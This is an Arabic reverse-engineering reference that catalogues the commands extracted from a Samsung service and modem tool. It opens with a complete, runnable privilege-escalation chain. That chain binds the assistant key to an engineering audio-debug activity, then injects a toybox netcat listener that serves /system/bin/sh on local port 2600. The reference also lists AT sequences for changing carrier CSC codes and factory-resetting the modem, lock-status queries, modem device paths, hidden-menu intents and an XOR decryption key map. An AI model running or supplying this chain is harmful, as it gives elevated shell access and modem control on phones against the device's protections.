# موسوعة الأوامر الشاملة لأدوات السيرفس ومودم سامسونج
## المستخرجة بالهندسة العكسية من كود غيدرا وملفات ELF (`AT` / `AT_unpacked` / `GHIDRA_DECOMPILEDQ.c`)

تم استخراج وتصنيف جميع الأوامر، الحزم، المنافذ، خصائص النظام، بروتوكولات الشل، وأكواد AT المستترة دون استثناء أي تفصيل.

---

## الفهرس العام
1. [أوامر الشل وأدوات النظام وثغرات التصعيد (Android Shell & Escalation)](#1-أوامر-الشل-وأدوات-النظام-وثغرات-التصعيد)
2. [أوامر مودم سامسونج والشبكة (Modem & AT Commands)](#2-أوامر-مودم-سامسونج-والشبكة)
3. [مسارات قنوات ومنافذ المودم (Modem Device Nodes & Sockets)](#3-مسارات-قنوات-ومنافذ-المودم)
4. [خصائص النظام المقروءة للتيليميتري (Android System Properties)](#4-خصائص-النظام-المقروءة-للتيليميتري)
5. [أوامر بروتوكول الجسر التفاعلي وسطر الأوامر (at-bridge Protocol & CLI)](#5-أوامر-بروتوكول-الجسر-التفاعلي-وسطر-الأوامر)
6. [حزم سامسونج الهندسية والأنشطة والقوائم السرية (Samsung Engineering & Secret Menus)](#6-حزم-سامسونج-الهندسية-والأنشطة-والقوائم-السرية)
7. [رسائل بروتوكول المصادقة والتوثيق (Auth & Handshake Tokens)](#7-رسائل-بروتوكول-المصادقة-والتوثيق)

---

## 1. أوامر الشل وأدوات النظام وثغرات التصعيد

هذه الأوامر تم تشفيرها بـ XOR داخل قطاع البيانات الثنائية وتم كسر تشفيرها بالكامل:

### أ) ثغرة تصعيد الصلاحيات عبر منفذ 2600 (Port 2600 Root/System Escalation)
تستغل الأداة حزمة هندسية موجودة مسبقاً في نظام سامسونج لتشغيل شل بصلاحيات مرتفعة:
```bash
# 1. ربط المساعد الصوتي أو النقر المزدوج على زر الطاقة بالنشاط الهندسي
settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1

# 2. تشغيل شاشة الإعدادات لتحفيز النشاط
am start -a android.settings.SETTINGS > /dev/null 2>&1

# 3. إرسال مفتاح المساعد لتفعيل النشاط
input keyevent 219 > /dev/null 2>&1

# 4. حقن أمر فتح شل محلي على المنفذ 2600 عبر Netcat المدمج
input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
input keyevent 66 > /dev/null 2>&1

# 5. تمرير الأوامر المرتفعة مباشرة عبر البورت 2600
echo "<COMMAND>" | /system/bin/toybox nc 127.0.0.1 2600 > /dev/null 2>&1
```

### ب) تصفية سجلات الراديو (Radio Buffer Flushing)
يتم تنفيذ هذا الأمر دائماً قبل إرسال أوامر AT لضمان قراءة استجابة المودم الحديثة فقط ومنع التداخل مع السجلات القديمة:
```bash
logcat -b radio -c > /dev/null 2>&1
```

### ج) تشغيل القوائم السرية والمودم (Samsung Secret Menu / Diag)
تشغيل واجهة الإعدادات المخفية لسامسونج وحقن أكواد التحويل لنمط Diag / USB:
```bash
am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1
```

### د) إدارة مهلة الشاشة وتجاوز القفل
```bash
# ضبط مهلة إغلاق الشاشة إلى 10 دقائق (600,000 مللي ثانية) لضمان عدم قفل الهاتف أثناء العملية
settings put system screen_off_timeout 600000 > /dev/null 2>&1
```

### هـ) محاكاة ضغطات الأزرار واللمس (Keyevents & UI Automation)
```bash
input keyevent 3 > /dev/null 2>&1      # زر الشاشة الرئيسية (Home Key)
input keyevent 61 > /dev/null 2>&1     # مفتاح Tab للانتقال بين العناصر
input keyevent 66 > /dev/null 2>&1     # مفتاح Enter للتأكيد
input keyevent 82 > /dev/null 2>&1     # زر القائمة (Menu Key)
input keyevent 219 > /dev/null 2>&1    # زر المساعد (Assist Key)
input tap <X> <Y>                      # النقر على إحداثيات محددة على الشاشة
```

### و) قراءة واجهة المستخدم وتفريغها (UI Hierarchy Inspection)
```bash
uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1   # تفريغ شجرة الواجهة
cat /sdcard/window_dump.xml                                # قراءة محتوى الشاشة لاكتشاف الأزرار
rm -rf /sdcard/window_dump.xml > /dev/null 2>&1            # حذف ملف التفريغ
```

### ز) فحص أقفال المشغلين وإزالة الوضع التجريبي (Carrier Locks & Retail Demo)
```bash
# البحث عن تطبيق فتح القفل لشبكة SK Telecom الكورية
pm list packages | grep com.skatd.unlock

# استعلام مسار تثبيت الحزم
pm path <PACKAGE_NAME>

# إيقاف الحزم بالقوة
am force-stop <PACKAGE_NAME>

# تنظيف بيانات تطبيق وضع العرض التجريبي في المحلات (Retail Mode)
com.samsung.rms.retailagent.global

# تنظيف بيانات حزمة اختبارات المصنع بعد إنهاء العملية
pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1
pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1
```

---

## 2. أوامر مودم سامسونج والشبكة (Modem & AT Commands)

### أ) تسلسل تغيير كود الدولة والمشغل (Samsung CSC Change Sequence)
يتم إرسال هذا التسلسل المكون من 5 خطوات عبر قناة المودم أو عبر مقبس RIL:
1. **الخطوة 1: فحص إعداد الـ CSC الحالي**
   ```text
   AT+PRECONFG=1,0
   ```
   *الرد المتوقع:* `+PRECONFG:1,<CURRENT_CSC>`
2. **الخطوة 2: حقن كود الـ CSC الجديد المطلوب**
   ```text
   AT+PRECONFG=2,<TARGET_CSC>
   ```
   *مثال:* `AT+PRECONFG=2,XAA` أو `AT+PRECONFG=2,TUR`
   *الرد المتوقع:* `+PRECONFG:2,OK`
3. **الخطوة 3: التحقق من قبول الكود**
   ```text
   AT+PRECONFG=1,0
   ```
   *الرد المتوقع:* `+PRECONFG:1,<TARGET_CSC>`
4. **الخطوة 4: إعادة تشغيل الراديو وتطبيق التهيئة**
   ```text
   AT+CFUN=1,1
   ```
5. **الخطوة 5: إعادة ضبط إعدادات المصنع للمودم (إن لزم)**
   ```text
   AT+FACTORST=0,0
   ```

### ب) أوامر فحص حالة أقفال الشبكة والشريحة (SIM & Network Lock Queries)
تُستخدم لمعرفة هل الهاتف مقفل على شبكة معينة أم مفتوح رسمياً:
| الأمر | الوظيفة التقنية | المعنى والقيم الممكنة |
| :--- | :--- | :--- |
| `AT+CPIN?` | استعلام حالة بطاقة SIM | `READY` (جاهزة)، `SIM PIN` (قفل PIN)، `SIM PUK` (مغلقة بـ PUK)، `PH-NET PIN` (مقفل شبكة) |
| `AT+CLCK="PN",2` | استعلام قفل الشبكة (Network Lock) | `+CLCK: 1` (مقفل)، `+CLCK: 0` (مفتوح رسمي لجميع الشبكات) |
| `AT+CLCK="PU",2` | استعلام قفل شبكة فرعية (Subset Lock) | فحص أقفال الشركات المشغلة الفرعية (MVNO) |
| `AT+CLCK="PP",2` | استعلام قفل مزود الخدمة (SP Lock) | قفل مشغل الخدمة المحدد |
| `AT+CLCK="PC",2` | استعلام قفل الشركات (Corporate Lock) | قفل شريحة الشركة (Enterprise Lock) |
| `AT+CLCK="SC",2` | استعلام قفل الشريحة (SIM Lock) | قفل الشريحة الذاتي |

### ج) أوامر العتاد ومفاتيح المصنع واستعلام IMEI
* **فحص الاستجابة الأساسي:**
  ```text
  AT
  ```
  *الرد:* `OK`
* **استعلام معلومات عتاد الجهاز والمودم:**
  ```text
  AT+DEVCONINFO
  ```
* **حقن مفاتيح المصنع (Keystring Injection):**
  ```text
  AT+KSTRINGB=0,3
  ```
* **اختبار وقراءة الـ IMEI المباشر من المودم:**
  ```text
  +IMEITEST:1,
  ```

---

## 3. مسارات قنوات ومنافذ المودم (Modem Device Nodes & Sockets)

تقوم الأداة بعمل مسح شامل (Scan) للمنافذ التالية بالترتيب لتحديد المنفذ النشط:

### أ) مقابس بروتوكول الراديو (Samsung RIL UNIX Sockets)
* `/dev/socket/rild` (المقبس الافتراضي لمودم الراديو الأول)
* `/dev/socket/rild-debug` (مقبس وضع التصحيح الهندسي لمودم سامسونج)
* `/dev/socket/rild-oem` (مقبس أوامر المصنع OEM الخاصة بسامسونج)
* `/dev/socket/rild2` (المقبس المخصص للشريحة الثانية Dual SIM)

### ب) قنوات مودم سامسونج شانون / إكسينوس (Samsung Shannon / Exynos IPC)
* `/dev/umts_at0` (قناة أوامر AT المباشرة لمعالجات إكسينوس)
* `/dev/umts_atc0` (قناة التحكم الثانوي بأوامر AT)
* `/dev/umts_boot0` (قناة إقلاع وتحديث المودم)
* `/dev/umts_ipc0` (قناة الاتصال الداخلي بين المعالج والمودم)
* `/dev/umts_rfs0` (نظام ملفات الراديو في الذاكرة)

### ج) قنوات مودم كوالكوم (Qualcomm Shared Memory Devices)
* `/dev/smd0` (قناة كوالكوم التشخيصية الأساسية)
* `/dev/smd7` (قناة أوامر AT لمودم كوالكوم)
* `/dev/smd11` (قناة البيانات وأوامر الـ RIL لكوالكوم)

### د) قنوات الموزعات والمنافذ التسلسلية (Serial / USB ACM Channels)
* `/dev/at_distributor` (موزع أوامر AT المدمج في نظام سامسونج)
* `/dev/at_distributor0` (الموزع الأول للأوامر)
* `/dev/ttyGS0` (منفذ USB Gadget التسلسلي عبر كابل الـ USB)
* `/dev/ttyACM0` (مودم USB ظاهري قياسي)
* `/dev/ttyUSB0` (منفذ تسلسلي تسلسلي مباشر)

---

## 4. خصائص النظام المقروءة للتيليميتري (Android System Properties)

تُقرأ عبر دالة Bionic libc المباشرة `__system_property_get`:

### أ) هوية الجهاز والعتاد
* `ro.product.model` (طراز الهاتف مثل SM-G998B)
* `ro.product.brand` (العلامة التجارية مثل samsung)
* `ro.product.name` (اسم المنتج البرمجي الداخلي)
* `ro.product.device` (اسم البوردة مثل p3s)
* `ro.product.manufacturer` (الشركة المصنعة: samsung)
* `ro.serialno` (الرقم التسلسلي للعتاد)

### ب) إصدارات النظام ومستوى الأمان
* `ro.build.version.release` (إصدار الأندرويد مثل 11, 12, 13, 14)
* `ro.build.version.sdk` (مستوى API مثل 30, 31, 33, 34)
* `ro.build.version.security_patch` (تاريخ حماية الأمان مثل 2024-05-01)
* `ro.build.version.incremental` (رقم البناء الفرعي)

### ج) إعدادات المودم والمشغل (CSC & Carrier)
* `ro.csc.sales_code` (كود التوزيع الحالي مثل XAA, TUR, KSA, INS)
* `ro.csc.countryiso_code` (كود الدولة القياسي ISO)
* `ro.boot.debug_level` (مستوى تصحيح البوت: 0x494c = Low, 0x494d = Mid, 0x4948 = High)
* `ro.boot.cp_debug_level` (مستوى تصحيح معالج المودم)

### د) حالة الشريحة والشبكة والسيريال الداخلي
* `gsm.sim.state` (حالة الشريحة: READY, ABSENT, PIN_REQUIRED, PU_REQUIRED)
* `gsm.sim.operator.numeric` (كود MCC/MNC للشريحة مثل 42001)
* `gsm.operator.numeric` (كود MCC/MNC للبرج المتصل به حالياً)
* `ril.serialnumber` (الرقم التسلسلي للمودم)
* `ril.approved_code` (كود الموافقة المعتمد)
* `ril.product_code` (كود المنتج للمودم)

### هـ) إعدادات وضع الـ USB
* `persist.sys.usb.config` (وضع الـ USB الثابت مثل acm,diag,adb)
* `sys.usb.config` (وضع الـ USB الحالي النشط)

---

## 5. أوامر بروتوكول الجسر التفاعلي وسطر الأوامر (at-bridge Protocol & CLI)

### أ) مفاتيح سطر الأوامر (Command-Line Arguments)
```text
  -c <CSC>      وضع تغيير كود الدولة السريع (مثال: -c XAA)
  -a <AT>       إرسال أمر AT مفرد واستقبال الرد ثم الخروج
  -x <HEX>      إرسال باقة RIL خام بالهكس
  -s            فحص واكتشاف قنوات المودم المتاحة تلقائياً
  -l            فحص شامل لأقفال الشبكة والشريحة (SIM & Network Locks)
  -d <DEV>      تحديد مسار قناة المودم يدوياً (مثال: -d /dev/umts_at0)
  -p <PORT>     تحديد منفذ خادم الـ TCP (الافتراضي: 2600)
  -v            تفعيل وضع السجلات المفصلة (Verbose Debugging)
  -h            عرض المساعدة وقائمة الأوامر
```

### ب) الأوامر التفاعلية أثناء جلسة الاتصال (Interactive Session Commands)
عند الاتصال بـ `at-bridge` عبر الشل أو الـ TCP Socket:
| الأمر التفاعلي | الوظيفة | مثال |
| :--- | :--- | :--- |
| `CSC:<CODE>` | تغيير كود CSC فورياً مع تسلسل الحفظ وإعادة التشغيل | `CSC:XAA` |
| `AT:<COMMAND>` | إرسال أمر AT خام للمودم والحصول على الرد | `AT:AT+CPIN?` |
| `HEX:<DATA>` | إرسال باقة RIL خام بصيغة Hexadecimal | `HEX:0000000c00000001` |
| `SCAN` | إعادة فحص واكتشاف قنوات المودم المتاحة | `SCAN` |
| `STATUS` | عرض تقرير حالة الهاتف، القناة، وإصدار النظام | `STATUS` |
| `LOCKS` | فحص أقفال SIM وقفل الشبكة Network Personalization | `LOCKS` |
| `RECONNECT` | إعادة فتح وتنشيط قناة المودم الحالية | `RECONNECT` |
| `HELP` | عرض قائمة الأوامر التفاعلية | `HELP` |
| `EXIT` / `QUIT`| إنهاء الجلسة وإغلاق الاتصال | `EXIT` |

### ج) باقة التيليميتري الموحدة المرسلة للكمبيوتر
```text
INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s
```

---

## 6. حزم سامسونج الهندسية والأنشطة والقوائم السرية

الحزم والأنشطة المستهدفة من الأداة لتنفيذ عمليات السيرفس:

| اسم الحزمة / النشاط | الدور والوظيفة |
| :--- | :--- |
| `com.sec.android.app.audiocoredebug` | الحزمة الهندسية لاختبارات الصوت التي تحتوي على ثغرة تنفيذ الشل |
| `com.sec.android.app.audiocoredebug.AudioAdbShellActivity` | النشاط الموجه له أوامر الـ Assistant لتنفيذ Toybox Netcat |
| `com.sec.hiddenmenu` | حزمة القوائم السرية العامة لهواتف سامسونج |
| `com.sec.hiddenmenu.IOTHiddenMenu` | نشاط إعدادات الراديو، فتح منافذ الـ Modem، وتبديل أوضاع USB Diag |
| `com.samsung.android.FactoryTestLauncher` | لانشر اختبارات المصنع المستخدم في فحص أجهزة سامسونج |
| `com.samsung.rms.retailagent.global` | عميل الوضع التجريبي (Samsung Retail Mode) المعني بإغلاق أجهزة العرض |
| `com.skatd.unlock` | حزمة فك القفل التلقائي التابعة لشبكة الاتصالات الكورية SK Telecom |
| `com.sdet.fotaagent` | عميل التحديثات الهوائية FOTA |

---

## 7. رسائل بروتوكول المصادقة والتوثيق (Auth & Handshake Tokens)

هذه الرسائل والرموز هي التي يتعامل معها البرنامج عند التحقق من مفاتيح الأمان وصلاحيات التنفيذ:

* `\n\n [+] Authantication Token : %s` (استخراج رمز التحدي الأمني للجلسة)
* `\n\n [+] Enter Authantication Key : ` (طلب إدخال مفتاح المصادقة من السيرفر)
* `[SUCCESS] Challenge key (CALC) obtained from %s: %s` (نجاح حساب مفتاح التحدي المعقد)
* `\n\nWrong AuthKey Error` (خطأ في مفتاح المصادقة)
* `\n\nRil Token Error, Try Again` (فشل توكن الـ RIL)
* `Worng Ril Command` (أمر RIL غير معروف أو غير مدعوم)
* `\n\n  [+] Ril Error 1 \n\n` (خطأ استجابة من مقبس RIL)
* `01000101` (بايتات التحقق الثنائية لبروتوكول التفويض)
* `RIL Exit` (رسالة إغلاق جلسة RIL)

---

## 8. ملخص شامل لجدول المفاتيح المشفرة (XOR Keys Map)

| مفتاح الـ XOR (Hex) | نوع الأمر المستخرج | المحتوى النموذجي |
| :--- | :--- | :--- |
| `0x20` | مسح لانشر المصنع | `pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1` |
| `0x22` | مسح حزمة الصوت | `pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1` |
| `0x24` | مهلة الشاشة | `settings put system screen_off_timeout 600000 > /dev/null 2>&1` |
| `0x25` | إعادة توجيه الإخراج | ` > /dev/null 2>&1` |
| `0x2b` | مفتاح Tab | `input keyevent 61 > /dev/null 2>&1` |
| `0x4e` | توجيه Netcat | `/system/bin/toybox nc 127.0.0.1 2600 > /dev/null 2>&1` |
| `0x66` | ضبط المساعد | `settings put system assistant .../AudioAdbShellActivity ...` |
| `0x76` | حزمة وضع المحلات | `com.samsung.rms.retailagent.global` |
| `0x7f` | القائمة السرية | `echo "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e ..."` |
| `0x7f` | تصفية سجلات الراديو | `logcat -b radio -c > /dev/null 2>&1` |
| `0x89` | مفتاح Enter | `input keyevent 66 > /dev/null 2>&1` |
| `0x91` | فتح الإعدادات | `am start -a android.settings.SETTINGS > /dev/null 2>&1` |
| `0x9a` | ضبط النقر المزدوج | `settings put global function_key_config_doublepress_value ...` |
| `0xc1` | مفتاح القائمة | `input keyevent 82 > /dev/null 2>&1` |
| `0xcf` | مفتاح المساعد | `input keyevent 219 > /dev/null 2>&1` |
| `0xd4` | قراءة الواجهة | `cat /sdcard/window_dump.xml` |
| `0xd5` | حذف ملف الواجهة | `rm -rf /sdcard/window_dump.xml > /dev/null 2>&1` |
| `0xd8` | فحص قفل SKT | `pm list packages | grep com.skatd.unlock` |
| `0xed` | حقن سيرفر Netcat | `input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'` |
| `0xfc` | إيقاف الحزم | `am force-stop` |
